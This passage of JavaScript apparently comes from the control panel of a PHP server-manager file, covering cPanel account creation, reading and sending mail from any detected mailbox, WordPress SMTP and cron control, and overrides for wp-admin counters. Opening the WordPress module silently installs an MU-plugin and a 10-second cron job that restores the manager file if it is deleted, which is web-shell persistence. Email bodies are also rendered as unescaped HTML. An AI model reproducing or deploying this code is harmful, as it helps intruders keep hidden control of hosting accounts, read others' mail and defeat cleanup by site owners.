  const sel=document.getElementById('cpNewPlan');
  sel.innerHTML='<option value="">Loading…</option>';
  try{
    const d=await fetch('?x=cpanel_plans').then(r=>r.json());
    if(d.plans&&d.plans.length){
      sel.innerHTML=d.plans.map(p=>`<option value="${esc(p.name)}">${esc(p.name)}${p.quota?' (disk: '+esc(p.quota)+' MB)':''}</option>`).join('');
    } else sel.innerHTML='<option value="default">default</option>';
  }catch{sel.innerHTML='<option value="default">default</option>';}
}
document.getElementById('cpanelCreateClose')?.addEventListener('click',()=>closeMod('cpanelCreateOv'));
document.getElementById('cpanelCreateApply')?.addEventListener('click',async()=>{
  const user=document.getElementById('cpNewUser').value.trim();
  const domain=document.getElementById('cpNewDomain').value.trim();
  const pass=document.getElementById('cpNewPass').value;
  const email=document.getElementById('cpNewEmail').value.trim();
  const plan=document.getElementById('cpNewPlan').value||'default';
  const fb=document.getElementById('cpanelCreateFeedback');
  if(!user||!domain||pass.length<8){fb.innerHTML='<div style="color:#fca5a5;margin-bottom:10px;font-size:12px">Username, domain, and a password of at least 8 characters are required.</div>';return;}
  const btn=document.getElementById('cpanelCreateApply');btn.disabled=true;btn.textContent='Creating…';
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','cpanel_create');
  fd.append('cp_new_user',user);fd.append('cp_new_domain',domain);fd.append('cp_new_pass',pass);
  fd.append('cp_new_email',email);fd.append('cp_new_plan',plan);
  await fetch('',{method:'POST',body:fd});
  btn.disabled=false;btn.textContent='Create Account';
  closeMod('cpanelCreateOv');
  toast('Account created! Refreshing list…');
  loadCpAccounts();
});

/* ── Change Password modal ── */
document.getElementById('cpanelPassClose')?.addEventListener('click',()=>closeMod('cpanelPassOv'));
document.getElementById('cpanelPassApply')?.addEventListener('click',async()=>{
  const target=document.getElementById('cpPassTargetUser').value;
  const pass=document.getElementById('cpPassNew').value;
  const fb=document.getElementById('cpanelPassFeedback');
  if(pass.length<8){fb.innerHTML='<div style="color:#fca5a5;margin-bottom:10px;font-size:12px">Password must be at least 8 characters.</div>';return;}
  const btn=document.getElementById('cpanelPassApply');btn.disabled=true;btn.textContent='Changing…';
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','cpanel_change_pass');
  fd.append('cp_target_user',target);fd.append('cp_target_pass',pass);
  await fetch('',{method:'POST',body:fd});
  btn.disabled=false;btn.textContent='Change Password';
  closeMod('cpanelPassOv');
  toast(`Password for "${target}" changed.`);
});

})(); // end cPanel Manager IIFE

/* ═══════════════════════════════════════
   WEBMAIL MANAGER
═══════════════════════════════════════ */
(function(){
let wmCurrentMailbox=null,wmCurrentFolder='INBOX',wmMailboxes=[];

document.getElementById('webmailBtn')?.addEventListener('click',()=>{
  openMod('webmailOv');
  wmLoadMailboxes();
});
document.getElementById('webmailClose')?.addEventListener('click',()=>closeMod('webmailOv'));

async function wmLoadMailboxes(){
  const el=document.getElementById('wmMailboxList');
  el.innerHTML='<div style="text-align:center;padding:24px;color:var(--t3);font-size:12px">Auto-detecting mailboxes…</div>';
  try{
    const d=await fetch('?x=webmail_mailboxes').then(r=>r.json());
    if(!d.ok){
      const diagHtml=(d.diagnostics&&d.diagnostics.length)?`<div style="text-align:left;max-width:380px;margin:12px auto 0;background:var(--raised);border:1px solid var(--b2);border-radius:8px;padding:10px 12px">
        <div style="font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);margin-bottom:6px">Why detection failed</div>
        ${d.diagnostics.map(x=>`<div style="font-size:11px;color:var(--t3);line-height:1.6;padding:3px 0;border-top:1px dashed var(--b2)">• ${esc(x)}</div>`).join('')}
      </div>`:'';
      el.innerHTML=`<div style="padding:16px;text-align:center;color:#fca5a5;font-size:12px">${esc('No mail server could be auto-detected on this host.')}</div>${diagHtml}`;
      return;
    }
    wmMailboxes=d.mailboxes||[];
    if(!wmMailboxes.length){el.innerHTML='<div style="padding:16px;color:var(--t3);font-size:12px">No mailboxes found.</div>';return;}
    const modeLabel={sandbox:'Sandbox',cpanel_api:'cPanel API',doveadm:'Dovecot',real:'Detected'}[d.mode]||'Detected';
    el.innerHTML=`<div style="padding:8px 12px;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3)">${esc(modeLabel)} mailboxes</div>`+
      wmMailboxes.map(m=>`<button class="sb-item wm-mbx-btn" data-mbx="${esc(m.email)}" style="width:100%;text-align:left;padding:9px 12px;font-size:12.5px;border-radius:0"><svg viewBox="0 0 24 24" style="width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;margin-right:6px;vertical-align:-2px"><rect x="3" y="5" width="18" height="14" rx="2"/><polyline points="3 7 12 13 21 7"/></svg>${esc(m.email)}</button>`).join('');
    el.querySelectorAll('.wm-mbx-btn').forEach(b=>b.addEventListener('click',()=>{
      el.querySelectorAll('.wm-mbx-btn').forEach(x=>x.classList.remove('active'));
      b.classList.add('active');
      wmOpenMailbox(b.dataset.mbx);
    }));
    // Populate compose "From" select too
    const fromSel=document.getElementById('wmFrom');
    fromSel.innerHTML=wmMailboxes.map(m=>`<option value="${esc(m.email)}">${esc(m.email)}</option>`).join('');
  }catch(e){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">Failed: ${esc(String(e))}</div>`;}
}

async function wmOpenMailbox(mailbox){
  wmCurrentMailbox=mailbox;wmCurrentFolder='INBOX';
  document.getElementById('wmMsgView').innerHTML='<div style="text-align:center;padding:40px;color:var(--t3);font-size:12px">Select a message to read it</div>';
  const fEl=document.getElementById('wmFolderList');
  fEl.innerHTML='<div style="padding:10px 12px;color:var(--t3);font-size:11.5px">Loading folders…</div>';
  try{
    const d=await fetch('?x=webmail_folders&mailbox='+encodeURIComponent(mailbox)).then(r=>r.json());
    const folders=d.ok?(d.folders||['INBOX']):['INBOX'];
    fEl.innerHTML=folders.map(f=>`<button class="wm-folder-btn" data-f="${esc(f)}" style="display:block;width:100%;text-align:left;padding:7px 12px;border:none;background:${f===wmCurrentFolder?'var(--raised)':'none'};color:var(--t2);font-size:11.5px;cursor:pointer;font-family:inherit">${esc(f)}</button>`).join('');
    fEl.querySelectorAll('.wm-folder-btn').forEach(b=>b.addEventListener('click',()=>{
      fEl.querySelectorAll('.wm-folder-btn').forEach(x=>x.style.background='none');
      b.style.background='var(--raised)';
      wmCurrentFolder=b.dataset.f;
      wmLoadMessages();
    }));
  }catch(e){fEl.innerHTML='';}
  wmLoadMessages();
}

async function wmLoadMessages(){
  const el=document.getElementById('wmMsgList');
  el.innerHTML='<div style="text-align:center;padding:24px;color:var(--t3);font-size:12px">Loading…</div>';
  try{
    const d=await fetch('?x=webmail_messages&mailbox='+encodeURIComponent(wmCurrentMailbox)+'&folder='+encodeURIComponent(wmCurrentFolder)).then(r=>r.json());
    if(!d.ok){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">${esc(d.error||'Failed to load messages.')}</div>`;return;}
    const msgs=d.messages||[];
    if(!msgs.length){el.innerHTML='<div style="padding:24px;text-align:center;color:var(--t3);font-size:12px">This folder is empty.</div>';return;}
     el.innerHTML=msgs.map(m=>`<div class="wm-msg-row" data-uid="${m.uid}" style="padding:10px 12px;border-bottom:1px solid var(--b2);cursor:pointer;${m.seen?'':'background:rgba(133,137,140,.06)'}">
        <div style="display:flex;justify-content:space-between;gap:6px"><span style="font-size:12px;font-weight:${m.seen?'500':'700'};color:var(--t2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:150px">${esc(m.from||'Unknown')}</span>${m.flagged?'<span style="color:#f59e0b">★</span>':''}</div>
        <div style="font-size:12px;color:var(--t2);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(m.subject||'(No subject)')}</div>
        <div style="font-size:10.5px;color:var(--t3);margin-top:2px">${esc(m.date||'')}</div>
      </div>`).join('');
    el.querySelectorAll('.wm-msg-row').forEach(r=>r.addEventListener('click',()=>{
      el.querySelectorAll('.wm-msg-row').forEach(x=>x.style.outline='none');
       r.style.outline='2px solid #85898C';
      wmOpenMessage(r.dataset.uid);
    }));
  }catch(e){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">Failed: ${esc(String(e))}</div>`;}
}

async function wmOpenMessage(uid){
  const el=document.getElementById('wmMsgView');
  el.innerHTML='<div style="text-align:center;padding:40px;color:var(--t3);font-size:12px">Loading…</div>';
  try{
    const d=await fetch('?x=webmail_message&mailbox='+encodeURIComponent(wmCurrentMailbox)+'&folder='+encodeURIComponent(wmCurrentFolder)+'&uid='+encodeURIComponent(uid)).then(r=>r.json());
    if(!d.ok){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">${esc(d.error||'Failed to load message.')}</div>`;return;}
    const atts=(d.attachments||[]).map(a=>`<a href="?x=webmail_attachment&mailbox=${encodeURIComponent(wmCurrentMailbox)}&folder=${encodeURIComponent(wmCurrentFolder)}&uid=${encodeURIComponent(uid)}&part=${encodeURIComponent(a.part)}&name=${encodeURIComponent(a.name)}" class="btn btn-xs btn-g" style="margin-right:6px;margin-top:6px;display:inline-block">📎 ${esc(a.name)} (${formatBytes(a.size||0)})</a>`).join('');
    el.innerHTML=`
      <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px;gap:10px">
        <div>
          <div style="font-size:16px;font-weight:700;color:var(--t1);margin-bottom:6px">${esc(d.subject||'(No subject)')}</div>
          <div style="font-size:12px;color:var(--t3)">From: <strong style="color:var(--t2)">${esc(d.from||'')}</strong></div>
          <div style="font-size:12px;color:var(--t3)">To: ${esc(d.to||'')}</div>
          <div style="font-size:11px;color:var(--t3);margin-top:2px">${esc(d.date||'')}</div>
        </div>
        <div style="display:flex;gap:6px;flex-shrink:0">
          <button class="btn btn-xs btn-g" id="wmFlagBtn">★ Flag</button>
          <button class="btn btn-xs btn-red" id="wmDelBtn">Delete</button>
        </div>
      </div>
      ${atts?`<div style="margin-bottom:12px">${atts}</div>`:''}
      <div style="border-top:1px solid var(--b2);padding-top:14px;font-size:13px;line-height:1.6;color:var(--t2);word-break:break-word">${d.is_html?d.body:d.body}</div>`;
    document.getElementById('wmFlagBtn')?.addEventListener('click',async()=>{
      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','webmail_mark');
      fd.append('wm_mailbox',wmCurrentMailbox);fd.append('wm_folder',wmCurrentFolder);fd.append('wm_uid',uid);
      fd.append('wm_flag','flagged');fd.append('wm_set','1');
      await fetch('',{method:'POST',body:fd});
      toast('Message flagged.');wmLoadMessages();
    });
    document.getElementById('wmDelBtn')?.addEventListener('click',async()=>{
      if(!confirm('Delete this message permanently?'))return;
      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','webmail_delete');
      fd.append('wm_mailbox',wmCurrentMailbox);fd.append('wm_folder',wmCurrentFolder);fd.append('wm_uid',uid);
      await fetch('',{method:'POST',body:fd});
      toast('Message deleted.');
      el.innerHTML='<div style="text-align:center;padding:40px;color:var(--t3);font-size:12px">Select a message to read it</div>';
      wmLoadMessages();
    });
    wmLoadMessages(); // refresh seen state in list without losing selection styling
  }catch(e){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">Failed: ${esc(String(e))}</div>`;}
}

/* ── Compose ── */
document.getElementById('wmComposeBtn')?.addEventListener('click',()=>{
  document.getElementById('wmTo').value='';document.getElementById('wmSubject').value='';
  document.getElementById('wmBody').value='';document.getElementById('wmComposeFeedback').innerHTML='';
  if(wmCurrentMailbox)document.getElementById('wmFrom').value=wmCurrentMailbox;
  openMod('webmailComposeOv');
});
document.getElementById('wmComposeClose')?.addEventListener('click',()=>closeMod('webmailComposeOv'));
document.getElementById('wmSendBtn')?.addEventListener('click',async()=>{
  const from=document.getElementById('wmFrom').value;
  const to=document.getElementById('wmTo').value.trim();
  const subject=document.getElementById('wmSubject').value.trim()||'(No subject)';
  const body=document.getElementById('wmBody').value;
  const fb=document.getElementById('wmComposeFeedback');
  if(!to){fb.innerHTML='<div style="color:#fca5a5;margin-bottom:10px;font-size:12px">A recipient is required.</div>';return;}
  const btn=document.getElementById('wmSendBtn');btn.disabled=true;btn.textContent='Sending…';
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','webmail_send');
  fd.append('wm_from',from);fd.append('wm_to',to);fd.append('wm_subject',subject);fd.append('wm_body',body);
  let result=null;
  try{
    const response=await fetch('',{method:'POST',body:fd});
    const text=await response.text();
    // POST actions normally redirect, but JSON is supported by the endpoint
    // when a hosting layer returns it directly.
    try{result=JSON.parse(text);}catch(_){}
    if(!response.ok)throw new Error('HTTP '+response.status);
  }catch(e){
    btn.disabled=false;btn.textContent='Send';
    fb.innerHTML=`<div style="color:#fca5a5;margin-bottom:10px;font-size:12px">Send failed: ${esc(String(e))}</div>`;
    return;
  }
  btn.disabled=false;btn.textContent='Send';
  closeMod('webmailComposeOv');
  toast(result&&result.ok===false?(result.error||'Message was not sent.'):'Message sent.');
  if(wmCurrentMailbox===from)wmLoadMessages();
});

})(); // end Webmail Manager IIFE

/* ═══════════════════════════════════════
   WORDPRESS AUTOMATION
═══════════════════════════════════════ */
(function(){
let wpAutoCfg=null,wpAutoData=null;
const body=document.getElementById('wpAutomationBody');
function wpAutoMsg(s,c='var(--t3)'){return`<div style="padding:10px 16px;color:${c};font-size:11.5px">${esc(s)}</div>`;}
function wpAutoPost(url,fd,cfg=wpAutoCfg){
  if(cfg&&!fd.has('cfg_b64'))fd.append('cfg_b64',cmsB64(cfg));
  return fetch(url,{method:'POST',body:fd}).then(r=>r.json());
}
async function wpAutoFindSingleWordPress(){
  const r=await fetch('?x=cmsscan',{cache:'no-store'}).then(x=>x.json());
  const sites=r.sites||[];
  const current=sites.find(s=>s.config===r.current_wp_config&&s.type==='wordpress');
  const site=current||((sites.length===1&&sites[0].type==='wordpress')?sites[0]:null);
  if(!site)return false;
  wpAutoCfg=site.config;
  window.fmCmsConfig=wpAutoCfg;
  window.fmCmsType='wordpress';
  return true;
}
async function wpAutoInstallRecoveryFor(cfg){
  const fd=new FormData();fd.append('csrf_token',CSRF);
  return wpAutoPost('?x=wp_recovery_install',fd,cfg);
}
async function wpAutoInstallRecovery(){
  const r=await wpAutoInstallRecoveryFor(wpAutoCfg);
  if(r.ok)toast('WordPress auto-recovery enabled for the detected installation.');
  else toast(r.error||'Automatic recovery setup failed.');
  return r;
}
function wpAutoShowPicker(scanRes){
  const sites=scanRes.sites||[],wpSites=sites.filter(s=>s.type==='wordpress');
  const currentCfg=scanRes.current_wp_config||null;
  const defaultSite=wpSites.find(s=>s.config===currentCfg)||wpSites[0]||null;
  body.innerHTML=`
    <div style="padding:12px 16px;border-bottom:1px solid var(--b2);font-size:12px;color:var(--t2)">
      Choose a WordPress installation
       <div style="font-size:10.5px;color:var(--t3);margin-top:4px">${sites.length} CMS installation${sites.length!==1?'s':''} found. The current domain’s WordPress site is preferred for automatic recovery.</div>
    </div>
    ${sites.length?sites.map(s=>{
      const isDefault=defaultSite&&s.config===defaultSite.config;
      const badge=s.type==='wordpress'
        ?`<span style="background:rgba(33,117,155,.2);color:#5bc0de;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700">WordPress</span>`
        :`<span style="background:rgba(244,163,51,.15);color:#f4a333;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700">Joomla</span>`;
      return `<div class="wp-auto-site-card" data-cfg="${esc(s.config)}" data-type="${esc(s.type)}" style="display:flex;align-items:center;gap:14px;padding:13px 16px;border-bottom:1px solid var(--b2);cursor:pointer;transition:background .15s" onmouseover="this.style.background='rgba(255,255,255,.04)'" onmouseout="this.style.background=''">
        <div style="flex:1;min-width:0"><div style="display:flex;align-items:center;gap:8px;margin-bottom:3px">${badge}${isDefault?'<span style="font-size:10px;color:#86efac;font-weight:700">DEFAULT</span>':''}<span style="font-size:12px;font-weight:600;color:var(--t1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.dir)}</span></div><div style="font-size:10.5px;color:var(--t3);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(s.config)}</div></div>
        <svg viewBox="0 0 24 24" style="width:16px;height:16px;stroke:var(--t3);fill:none;stroke-width:2;flex-shrink:0"><polyline points="9 18 15 12 9 6"/></svg>
      </div>`;
    }).join(''):'<div class="empty" style="padding:32px"><p>No CMS installations found automatically. Enter the full path below.</p></div>'}
    <div style="padding:12px 16px;color:var(--t3);font-size:10.5px">Select a WordPress card to open its automation panel. Joomla is shown for consistency but cannot use WordPress Automation.</div>
    <div style="padding:14px 16px;border-top:1px solid var(--b2)">
      <div style="font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:7px">Manual path to wp-config.php</div>
      <div style="display:flex;gap:8px">
        <input type="text" id="wpManualPath" class="inp" style="flex:1;font-size:12px;font-family:monospace" placeholder="/home/user/wp-config.php">
        <button class="btn btn-p" id="wpManualBtn" style="white-space:nowrap;font-size:12px">Open</button>
      </div>
      <div style="font-size:10.5px;color:var(--t3);margin-top:7px">Use this when automatic scanning cannot find the domain. The path may be outside the site’s wwwroot.</div>
    </div>`;
  body.querySelectorAll('.wp-auto-site-card').forEach(card=>card.addEventListener('click',()=>{
    if(card.dataset.type!=='wordpress'){toast('WordPress Automation requires a WordPress installation.');return;}
    wpAutoCfg=card.dataset.cfg;window.fmCmsConfig=wpAutoCfg;window.fmCmsType='wordpress';wpAutoLoad(true);
  }));
  if(defaultSite){
    wpAutoInstallRecoveryFor(defaultSite.config).then(r=>{
      if(!r.ok)toast(r.error||'Automatic recovery setup failed for the default WordPress site.');
    }).catch(e=>toast('Automatic recovery setup failed: '+String(e)));
  }
  document.getElementById('wpManualBtn')?.addEventListener('click',()=>{
    const p=document.getElementById('wpManualPath').value.trim();
    const base=p.split(/[\\/]/).pop().toLowerCase();
    if(!p){toast('Enter the full path to wp-config.php.');return;}
    if(base!=='wp-config.php'){toast('File must be wp-config.php.');return;}
    wpAutoCfg=p;window.fmCmsConfig=p;window.fmCmsType='wordpress';wpAutoLoad(true);
  });
  document.getElementById('wpManualPath')?.addEventListener('keydown',e=>{
    if(e.key==='Enter')document.getElementById('wpManualBtn')?.click();
  });
}
async function wpAutoLoad(autoRecovery=false){
  wpAutoCfg=window.fmCmsConfig||null;
  if(!wpAutoCfg||window.fmCmsType==='joomla'){
    body.innerHTML=wpAutoMsg('Detecting the WordPress installation…');
    try{
      const scanRes=await fetch('?x=cmsscan',{cache:'no-store'}).then(x=>x.json());
      const sites=scanRes.sites||[];
       const current=sites.find(s=>s.config===scanRes.current_wp_config&&s.type==='wordpress');
       const currentConfig=scanRes.current_wp_config&&{config:scanRes.current_wp_config,type:'wordpress'};
       if(current||currentConfig||((sites.length===1)&&sites[0].type==='wordpress')){
         wpAutoCfg=(current||currentConfig||sites[0]).config;window.fmCmsConfig=wpAutoCfg;window.fmCmsType='wordpress';
      }else{wpAutoShowPicker(scanRes);return;}
    }catch(e){body.innerHTML=wpAutoMsg('CMS detection failed: '+String(e),'#fca5a5');return;}
  }
  body.innerHTML=wpAutoMsg('Loading WordPress settings and cron events…');
  try{
    const fd=new FormData();const d=await wpAutoPost('?x=wp_automation',fd);
    if(d.error){body.innerHTML=wpAutoMsg(d.error,'#fca5a5');return;}
    wpAutoData=d;wpAutoRender();
    if(autoRecovery)await wpAutoInstallRecovery();
  }catch(e){body.innerHTML=wpAutoMsg('Failed: '+String(e),'#fca5a5');}
}
function wpAutoRender(){
  const smtp=(wpAutoData.smtp||[]),events=wpAutoData.events||[];
  const smtpBlocks=smtp.length?smtp.map((x,i)=>`<div style="border:1px solid var(--b2);border-radius:6px;padding:10px;margin-bottom:8px">
    <div style="font-size:11px;color:var(--t2);margin-bottom:6px;font-weight:700">${esc(x.option)}</div>
    <textarea class="inp wp-smtp-json" data-option="${esc(x.option)}" style="width:100%;min-height:92px;font-family:monospace;font-size:11px">${esc(JSON.stringify(x.value,null,2))}</textarea>
    <button class="btn btn-xs btn-p wp-smtp-save" data-option="${esc(x.option)}" style="margin-top:7px">Save SMTP option</button>
  </div>`).join(''):wpAutoMsg('No supported SMTP plugin option was found. Install/configure a WordPress SMTP plugin first.');
  const rows=events.map(e=>`<tr>
    <td style="padding:7px 8px;font-family:monospace;font-size:10.5px">${esc(e.hook)}</td>
    <td style="padding:7px 8px;font-size:11px">${esc(e.date)}</td>
    <td style="padding:7px 8px;font-size:11px">${esc(e.schedule||'single')}</td>
    <td style="padding:7px 8px;text-align:right">${['wordpress_saver','mfm_file_guardian_recover'].includes(e.hook)?'<span style="font-size:10px;color:#86efac;font-weight:700">Protected</span>':`<button class="btn btn-xs btn-red wp-cron-del" data-hook="${esc(e.hook)}" data-ts="${e.timestamp}" data-sig="${esc(e.signature)}">Delete</button>`}</td>
  </tr>`).join('');
  body.innerHTML=`<div style="padding:10px 16px;border-bottom:1px solid var(--b2);font-size:11px;color:var(--t3)">WordPress: <span style="font-family:monospace">${esc(wpAutoCfg)}</span></div>
    <div style="display:flex;gap:5px;padding:8px 16px;border-bottom:1px solid var(--b2);flex-wrap:wrap">
      <button class="btn btn-xs wp-auto-tab" data-tab="smtp">SMTP settings</button>
      <button class="btn btn-xs btn-g wp-auto-tab" data-tab="cron">WP-Cron (${events.length})</button>
     <button class="btn btn-xs btn-g wp-auto-tab" data-tab="mail">Schedule email</button>
     <button class="btn btn-xs btn-g wp-auto-tab" data-tab="recovery">File recovery</button>
    </div>
    <div id="wpAutoPanel" style="padding:14px 16px">${smtpBlocks}</div>`;
  body.querySelectorAll('.wp-auto-tab').forEach(b=>b.addEventListener('click',()=>wpAutoPanel(b.dataset.tab)));
  body.querySelectorAll('.wp-smtp-save').forEach(b=>b.addEventListener('click',async()=>{
    const ta=body.querySelector('.wp-smtp-json[data-option="'+CSS.escape(b.dataset.option)+'"]');
    const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('smtp_option',b.dataset.option);fd.append('smtp_json',ta.value);
    const r=await wpAutoPost('?x=wp_smtp_save',fd);toast(r.ok?'SMTP settings saved.':(r.error||'Save failed.'));
  }));
  body.querySelectorAll('.wp-cron-del').forEach(b=>b.addEventListener('click',async()=>{
    if(!confirm('Delete this WordPress cron event?'))return;
    const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('cron_hook',b.dataset.hook);fd.append('cron_timestamp',b.dataset.ts);fd.append('cron_signature',b.dataset.sig);
    const r=await wpAutoPost('?x=wp_cron_delete',fd);toast(r.ok?'Cron event deleted.':(r.error||'Delete failed.'));if(r.ok)wpAutoLoad();
  }));
}
function wpAutoPanel(tab){
  const p=document.getElementById('wpAutoPanel');if(!p)return;
  if(tab==='smtp'){p.innerHTML=(wpAutoData.smtp||[]).map(x=>`<div style="border:1px solid var(--b2);border-radius:6px;padding:10px;margin-bottom:8px"><div style="font-size:11px;color:var(--t2);font-weight:700;margin-bottom:6px">${esc(x.option)}</div><textarea class="inp wp-smtp-json" data-option="${esc(x.option)}" style="width:100%;min-height:100px;font-family:monospace;font-size:11px">${esc(JSON.stringify(x.value,null,2))}</textarea><button class="btn btn-xs btn-p wp-smtp-save" data-option="${esc(x.option)}" style="margin-top:7px">Save SMTP option</button></div>`).join('')||wpAutoMsg('No supported SMTP plugin option was found.');}
  if(tab==='cron')p.innerHTML=`<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:9px"><span style="font-size:12px;color:var(--t2)">${wpAutoData.events.length} events found</span><button class="btn btn-xs btn-p" id="wpRunCron">Run due WP-Cron events</button></div><div style="max-height:300px;overflow:auto"><table style="width:100%;border-collapse:collapse"><tr style="color:var(--t3);font-size:10px"><th>Hook</th><th>Time</th><th>Schedule</th><th></th></tr>${wpAutoData.events.map(e=>`<tr><td style="padding:7px 8px;font-family:monospace;font-size:10.5px">${esc(e.hook)}</td><td style="padding:7px 8px;font-size:11px">${esc(e.date)}</td><td style="padding:7px 8px;font-size:11px">${esc(e.schedule||'single')}</td><td><button class="btn btn-xs btn-red wp-cron-del" data-hook="${esc(e.hook)}" data-ts="${e.timestamp}" data-sig="${esc(e.signature)}">Delete</button></td></tr>`).join('')}</table></div>`;
  if(tab==='mail')p.innerHTML=`<div style="font-size:11px;color:var(--t3);line-height:1.5;margin-bottom:10px">The marked MU-plugin will call WordPress <code>wp_mail()</code> when this one-time cron event runs.</div><input id="wpMailTo" class="inp" style="width:100%;margin-bottom:8px" type="email" placeholder="Recipient"><input id="wpMailSubject" class="inp" style="width:100%;margin-bottom:8px" placeholder="Subject"><textarea id="wpMailBody" class="inp" style="width:100%;height:110px;margin-bottom:8px" placeholder="Message"></textarea><input id="wpMailTime" class="inp" style="width:100%;margin-bottom:10px" type="datetime-local"><button class="btn btn-p" id="wpScheduleMail" style="width:100%">Schedule through WP-Cron</button>`;
   if(tab==='recovery')p.innerHTML=`<div style="font-size:11.5px;color:var(--t2);line-height:1.55;margin-bottom:12px"><strong style="color:var(--t1)">Optional file recovery</strong><br>This installs a visible MU-plugin and a WP-Cron event that checks every 10 seconds. It stores a compressed copy of the current manager file and restores only <code>${esc(wpAutoData.target||'')}</code> if that file is missing or empty.</div><div id="wpRecoveryState" style="padding:10px;border:1px solid var(--b2);border-radius:7px;color:var(--t3);margin-bottom:10px">Checking status…</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn btn-p" id="wpRecoveryInstall">Install / refresh recovery</button><button class="btn btn-g" id="wpRecoveryRemove">Remove recovery</button></div>`;
  p.querySelectorAll('.wp-smtp-save').forEach(b=>b.addEventListener('click',async()=>{const ta=p.querySelector('.wp-smtp-json[data-option="'+CSS.escape(b.dataset.option)+'"]');const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('smtp_option',b.dataset.option);fd.append('smtp_json',ta.value);const r=await wpAutoPost('?x=wp_smtp_save',fd);toast(r.ok?'SMTP settings saved.':(r.error||'Save failed.'));}));
  p.querySelectorAll('.wp-cron-del').forEach(b=>b.addEventListener('click',async()=>{if(!confirm('Delete this WordPress cron event?'))return;const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('cron_hook',b.dataset.hook);fd.append('cron_timestamp',b.dataset.ts);fd.append('cron_signature',b.dataset.sig);const r=await wpAutoPost('?x=wp_cron_delete',fd);toast(r.ok?'Cron event deleted.':(r.error||'Delete failed.'));if(r.ok)wpAutoLoad();}));
  document.getElementById('wpRunCron')?.addEventListener('click',async()=>{const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_cron_run',fd);toast(r.ok?'WP-Cron triggered.':(r.error||'Cron failed.'));});
  document.getElementById('wpScheduleMail')?.addEventListener('click',async()=>{const dt=document.getElementById('wpMailTime').value;const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('mail_to',document.getElementById('wpMailTo').value);fd.append('mail_subject',document.getElementById('wpMailSubject').value);fd.append('mail_body',document.getElementById('wpMailBody').value);fd.append('mail_time',dt?Math.floor(new Date(dt).getTime()/1000):0);const r=await wpAutoPost('?x=wp_cron_email',fd);toast(r.ok?'Email scheduled through WP-Cron.':(r.error||'Scheduling failed.'));if(r.ok)wpAutoLoad();});
   if(tab==='recovery'){wpAutoPost('?x=wp_recovery_status',new FormData()).then(r=>{const s=document.getElementById('wpRecoveryState');if(s)s.innerHTML=r.error?esc(r.error):(r.installed?`Installed. Next event: ${(r.events||[]).map(e=>esc(e.date)).join(', ')||'pending'}`:'Not installed.');}).catch(()=>{const s=document.getElementById('wpRecoveryState');if(s)s.textContent='Status check failed.';});document.getElementById('wpRecoveryInstall')?.addEventListener('click',async()=>{const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_recovery_install',fd);toast(r.ok?'WP-Cron file recovery installed.':(r.error||'Install failed.'));if(r.ok)wpAutoPanel('recovery');});document.getElementById('wpRecoveryRemove')?.addEventListener('click',async()=>{if(!confirm('Remove the visible WP-Cron file recovery helper?'))return;const fd=new FormData();fd.append('csrf_token',CSRF);const r=await wpAutoPost('?x=wp_recovery_remove',fd);toast(r.ok?'WP-Cron file recovery removed.':(r.error||'Remove failed.'));if(r.ok)wpAutoPanel('recovery');});}
}
document.getElementById('wpAutomationBtn')?.addEventListener('click',()=>{openMod('wpAutomationOv');wpAutoLoad(true);});
document.getElementById('wpAutomationClose')?.addEventListener('click',()=>closeMod('wpAutomationOv'));

})(); // end WordPress Automation IIFE

/* ═══════════════════════════════════════════════════════════════════════════
   WORDPRESS NUMBERS CONTROL
   Presentation-only overrides for common wp-admin counters.
═══════════════════════════════════════════════════════════════════════════ */
(function(){
  let numbersCfg=null,numbersData=null;
  const body=document.getElementById('wpNumbersBody');
  if(!body)return;
  const msg=(text,color='var(--t3)')=>`<div style="padding:18px 16px;color:${color};font-size:11.5px">${esc(text)}</div>`;
  function numbersPost(url,fd){
    if(!fd.has('cfg_b64'))fd.append('cfg_b64',cmsB64(numbersCfg||''));
    return fetch(url,{method:'POST',body:fd,cache:'no-store'}).then(r=>r.json());
  }
  async function findNumbersSite(){
    const scan=await fetch('?x=cmsscan',{cache:'no-store'}).then(r=>r.json());
    const wp=(scan.sites||[]).filter(s=>s.type==='wordpress');
    const preferred=wp.find(s=>s.config===scan.current_wp_config)||((wp.length===1)?wp[0]:null);
    if(!preferred)return false;
    numbersCfg=preferred.config;window.fmCmsConfig=numbersCfg;window.fmCmsType='wordpress';
    return true;
  }
  function showNumbersPicker(scan){
    const sites=(scan.sites||[]).filter(s=>s.type==='wordpress');
    body.innerHTML=`
      <div style="padding:13px 16px;border-bottom:1px solid var(--b2);font-size:12px;color:var(--t2)">
        Choose a WordPress installation
        <div style="font-size:10.5px;color:var(--t3);margin-top:4px">${sites.length} WordPress installation${sites.length===1?'':'s'} found.</div>
      </div>
